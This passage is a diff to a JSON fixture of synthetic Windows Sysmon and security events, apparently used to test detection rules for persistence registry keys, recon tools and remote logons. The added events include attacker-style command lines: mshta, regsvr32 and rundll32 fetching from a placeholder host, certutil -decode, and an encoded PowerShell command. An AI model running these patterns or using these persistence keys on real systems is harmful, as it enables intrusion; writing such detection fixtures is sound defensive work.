@@ -9,6 +9,26 @@
       "fields": {
         "TargetObject": "HKLM\\Software\\Example\\winlogon\\shell"
       }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-0",
+      "event_id": 13,
+      "record_id": 6000,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "hklm\\software\\example\\winlogon\\shell"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-1",
+      "event_id": 13,
+      "record_id": 6001,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "HKLM\\SOFTWARE\\EXAMPLE\\WINLOGON\\SHELL"
+      }
     }
   ],
   "winlogon-userinit": [
@@ -20,6 +40,26 @@
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
         "TargetObject": "HKLM\\Software\\Example\\winlogon\\userinit"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-0",
+      "event_id": 13,
+      "record_id": 6010,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "hklm\\software\\example\\winlogon\\userinit"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-1",
+      "event_id": 13,
+      "record_id": 6011,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "HKLM\\SOFTWARE\\EXAMPLE\\WINLOGON\\USERINIT"
       }
     }
   ],
@@ -33,6 +73,26 @@
       "fields": {
         "TargetObject": "HKLM\\Software\\Example\\image file execution options\\example.exe\\debugger"
       }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-0",
+      "event_id": 13,
+      "record_id": 6020,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "hklm\\software\\example\\image file execution options\\example.exe\\debugger"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-1",
+      "event_id": 13,
+      "record_id": 6021,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "HKLM\\SOFTWARE\\EXAMPLE\\IMAGE FILE EXECUTION OPTIONS\\EXAMPLE.EXE\\DEBUGGER"
+      }
     }
   ],
   "appinit-dlls": [
@@ -44,6 +104,26 @@
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
         "TargetObject": "HKLM\\Software\\Example\\windows\\appinit_dlls"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-0",
+      "event_id": 13,
+      "record_id": 6030,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "hklm\\software\\example\\windows\\appinit_dlls"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-1",
+      "event_id": 13,
+      "record_id": 6031,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "HKLM\\SOFTWARE\\EXAMPLE\\WINDOWS\\APPINIT_DLLS"
       }
     }
   ],
@@ -57,6 +137,26 @@
       "fields": {
         "TargetObject": "HKLM\\Software\\Example\\control\\lsa\\security packages"
       }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-0",
+      "event_id": 13,
+      "record_id": 6040,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "hklm\\software\\example\\control\\lsa\\security packages"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-1",
+      "event_id": 13,
+      "record_id": 6041,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "HKLM\\SOFTWARE\\EXAMPLE\\CONTROL\\LSA\\SECURITY PACKAGES"
+      }
     }
   ],
   "lsa-auth-packages": [
@@ -68,6 +168,26 @@
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
         "TargetObject": "HKLM\\Software\\Example\\control\\lsa\\authentication packages"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-0",
+      "event_id": 13,
+      "record_id": 6050,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "hklm\\software\\example\\control\\lsa\\authentication packages"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-1",
+      "event_id": 13,
+      "record_id": 6051,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "HKLM\\SOFTWARE\\EXAMPLE\\CONTROL\\LSA\\AUTHENTICATION PACKAGES"
       }
     }
   ],
@@ -81,6 +201,26 @@
       "fields": {
         "TargetObject": "HKLM\\Software\\Example\\print\\monitors\\example monitor\\driver"
       }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-0",
+      "event_id": 13,
+      "record_id": 6060,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "hklm\\software\\example\\print\\monitors\\example monitor\\driver"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-1",
+      "event_id": 13,
+      "record_id": 6061,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "HKLM\\SOFTWARE\\EXAMPLE\\PRINT\\MONITORS\\EXAMPLE MONITOR\\DRIVER"
+      }
     }
   ],
   "boot-execute": [
@@ -92,6 +232,26 @@
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
         "TargetObject": "HKLM\\Software\\Example\\session manager\\bootexecute"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-0",
+      "event_id": 13,
+      "record_id": 6070,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "hklm\\software\\example\\session manager\\bootexecute"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-1",
+      "event_id": 13,
+      "record_id": 6071,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "HKLM\\SOFTWARE\\EXAMPLE\\SESSION MANAGER\\BOOTEXECUTE"
       }
     }
   ],
@@ -105,6 +265,26 @@
       "fields": {
         "TargetObject": "HKLM\\Software\\Example\\office\\word\\addins\\example\\loadbehavior"
       }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-0",
+      "event_id": 13,
+      "record_id": 6080,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "hklm\\software\\example\\office\\word\\addins\\example\\loadbehavior"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-1",
+      "event_id": 13,
+      "record_id": 6081,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "HKLM\\SOFTWARE\\EXAMPLE\\OFFICE\\WORD\\ADDINS\\EXAMPLE\\LOADBEHAVIOR"
+      }
     }
   ],
   "screensaver-path": [
@@ -116,6 +296,26 @@
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
         "TargetObject": "HKLM\\Software\\Example\\control panel\\desktop\\scrnsave.exe"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-0",
+      "event_id": 13,
+      "record_id": 6090,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "hklm\\software\\example\\control panel\\desktop\\scrnsave.exe"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-1",
+      "event_id": 13,
+      "record_id": 6091,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "HKLM\\SOFTWARE\\EXAMPLE\\CONTROL PANEL\\DESKTOP\\SCRNSAVE.EXE"
       }
     }
   ],
@@ -129,6 +329,26 @@
       "fields": {
         "TargetObject": "HKLM\\Software\\Example\\real-time protection\\disablerealtimemonitoring"
       }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-0",
+      "event_id": 13,
+      "record_id": 6100,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "hklm\\software\\example\\real-time protection\\disablerealtimemonitoring"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-1",
+      "event_id": 13,
+      "record_id": 6101,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "HKLM\\SOFTWARE\\EXAMPLE\\REAL-TIME PROTECTION\\DISABLEREALTIMEMONITORING"
+      }
     }
   ],
   "uac-policy-change": [
@@ -141,6 +361,26 @@
       "fields": {
         "TargetObject": "HKLM\\Software\\Example\\policies\\system\\enablelua"
       }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-0",
+      "event_id": 13,
+      "record_id": 6110,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "hklm\\software\\example\\policies\\system\\enablelua"
+      }
+    },
+    {
+      "source": "sysmon",
+      "host": "WIN-CATALOG-1",
+      "event_id": 13,
+      "record_id": 6111,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "TargetObject": "HKLM\\SOFTWARE\\EXAMPLE\\POLICIES\\SYSTEM\\ENABLELUA"
+      }
     }
   ],
   "system-information": [
@@ -148,10 +388,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 213,
+      "record_id": 2000,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\systeminfo.exe"
+        "NewProcessName": "C:\\Example\\systeminfo.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2001,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\systeminfo.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2002,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\systeminfo.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -160,10 +423,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 214,
+      "record_id": 2010,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\whoami.exe"
+        "NewProcessName": "C:\\Example\\whoami.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2011,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\whoami.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2012,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\whoami.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -172,10 +458,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 215,
+      "record_id": 2020,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\ipconfig.exe"
+        "NewProcessName": "C:\\Example\\ipconfig.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2021,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\ipconfig.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2022,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\ipconfig.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -184,10 +493,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 216,
+      "record_id": 2030,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\netstat.exe"
+        "NewProcessName": "C:\\Example\\netstat.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2031,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\netstat.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2032,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\netstat.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -196,10 +528,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 217,
+      "record_id": 2040,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\nbtstat.exe"
+        "NewProcessName": "C:\\Example\\nbtstat.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2041,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\nbtstat.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2042,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\nbtstat.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -208,10 +563,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 218,
+      "record_id": 2050,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\tasklist.exe"
+        "NewProcessName": "C:\\Example\\tasklist.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2051,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\tasklist.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2052,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\tasklist.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -220,10 +598,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 219,
+      "record_id": 2060,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\nltest.exe"
+        "NewProcessName": "C:\\Example\\nltest.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2061,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\nltest.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2062,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\nltest.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -232,10 +633,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 220,
+      "record_id": 2070,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\cmd.exe"
+        "NewProcessName": "C:\\Example\\cmd.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2071,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\cmd.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2072,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\cmd.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -244,10 +668,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 221,
+      "record_id": 2080,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\wscript.exe"
+        "NewProcessName": "C:\\Example\\wscript.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2081,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\wscript.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2082,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\wscript.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -256,10 +703,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 222,
+      "record_id": 2090,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\cscript.exe"
+        "NewProcessName": "C:\\Example\\cscript.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2091,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\cscript.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2092,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\cscript.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -268,10 +738,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 223,
+      "record_id": 2100,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\mshta.exe"
+        "NewProcessName": "C:\\Example\\mshta.exe",
+        "CommandLine": "mshta.exe https://example.invalid/a"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2101,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\mshta.exe",
+        "CommandLine": "mshta.exe javascript:example"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2102,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\mshta.exe",
+        "CommandLine": "mshta.exe vbscript:example"
       }
     }
   ],
@@ -280,10 +773,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 224,
+      "record_id": 2110,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\msiexec.exe"
+        "NewProcessName": "C:\\Example\\msiexec.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2111,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\msiexec.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2112,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\msiexec.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -292,10 +808,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 225,
+      "record_id": 2120,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\regsvr32.exe"
+        "NewProcessName": "C:\\Example\\regsvr32.exe",
+        "CommandLine": "regsvr32.exe https://example.invalid/a"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2121,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\regsvr32.exe",
+        "CommandLine": "regsvr32.exe sample.sct"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2122,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\regsvr32.exe",
+        "CommandLine": "regsvr32.exe sample.js"
       }
     }
   ],
@@ -304,10 +843,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 226,
+      "record_id": 2130,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\rundll32.exe"
+        "NewProcessName": "C:\\Example\\rundll32.exe",
+        "CommandLine": "rundll32.exe https://example.invalid/a"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2131,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\rundll32.exe",
+        "CommandLine": "rundll32.exe sample.js"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2132,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\rundll32.exe",
+        "CommandLine": "rundll32.exe sample.vbs"
       }
     }
   ],
@@ -316,10 +878,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 227,
+      "record_id": 2140,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\installutil.exe"
+        "NewProcessName": "C:\\Example\\installutil.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2141,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\installutil.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2142,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\installutil.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -328,10 +913,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 228,
+      "record_id": 2150,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\msbuild.exe"
+        "NewProcessName": "C:\\Example\\msbuild.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2151,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\msbuild.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2152,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\msbuild.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -340,10 +948,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 229,
+      "record_id": 2160,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\mstsc.exe"
+        "NewProcessName": "C:\\Example\\mstsc.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2161,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\mstsc.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2162,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\mstsc.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -352,10 +983,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 230,
+      "record_id": 2170,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
-        "NewProcessName": "C:\\Example\\ssh.exe"
+        "NewProcessName": "C:\\Example\\ssh.exe",
+        "ParentProcessName": "C:/Example/winword.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2171,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\ssh.exe",
+        "ParentProcessName": "C:/Example/chrome.exe"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2172,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\ssh.exe",
+        "ParentProcessName": "C:/Example/wscript.exe"
       }
     }
   ],
@@ -364,11 +1018,33 @@
       "source": "security",
       "host": "WIN-SYNTHETIC",
       "event_id": 4688,
-      "record_id": 231,
+      "record_id": 2180,
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
         "NewProcessName": "C:\\Example\\certutil.exe",
-        "CommandLine": "certutil.exe synthetic-decode-token"
+        "CommandLine": "certutil.exe -decode fixture-A fixture-B"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2181,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\certutil.exe",
+        "CommandLine": "certutil.exe -decode input output"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-SYNTHETIC",
+      "event_id": 4688,
+      "record_id": 2182,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "NewProcessName": "C:\\Example\\certutil.exe",
+        "CommandLine": "certutil.exe -DECODE fixture output"
       }
     }
   ],
@@ -382,6 +1058,28 @@
       "fields": {
         "LogonType": "10"
       }
+    },
+    {
+      "source": "security",
+      "host": "WIN-CATALOG-0",
+      "event_id": 4624,
+      "record_id": 6310,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "LogonType": "10",
+        "TargetUserName": "fixture-admin"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-CATALOG-1",
+      "event_id": 4624,
+      "record_id": 6311,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "LogonType": "10",
+        "TargetUserName": "fixture-support"
+      }
     }
   ],
   "remote-interactive-logon-failure": [
@@ -393,6 +1091,28 @@
       "timestamp": "2026-01-15T10:15:00Z",
       "fields": {
         "LogonType": "10"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-CATALOG-0",
+      "event_id": 4625,
+      "record_id": 6320,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "LogonType": "10",
+        "TargetUserName": "fixture-admin"
+      }
+    },
+    {
+      "source": "security",
+      "host": "WIN-CATALOG-1",
+      "event_id": 4625,
+      "record_id": 6321,
+      "timestamp": "2026-01-15T10:15:00Z",
+      "fields": {
+        "LogonType": "10",
+        "TargetUserName": "fixture-support"
       }
     }
   ],
@@ -443,8 +1163,582 @@
     }
   ],
   "powershell-encoded-command": [
-    {"source": "security", "host": "WIN-SYNTHETIC", "event_id": 4688, "record_id": 901, "timestamp": "2026-01-15T10:00:00Z", "fields": {"NewProcessName": "C:/Example/powershell.exe", "CommandLine": "powershell.exe -EncodedCommand AAAA"}},
